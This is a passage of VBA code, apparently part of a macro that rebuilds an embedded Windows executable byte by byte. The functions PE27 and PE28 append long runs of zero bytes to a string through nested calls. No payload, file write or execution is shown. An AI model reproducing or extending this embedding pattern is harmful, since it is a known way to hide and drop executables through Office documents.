    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)

    PE27 = strPE
End Function

Private Function PE28() As String
   Dim strPE As String

    strPE = ""
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
    strPE = A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(A(strPE, 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0), 0)
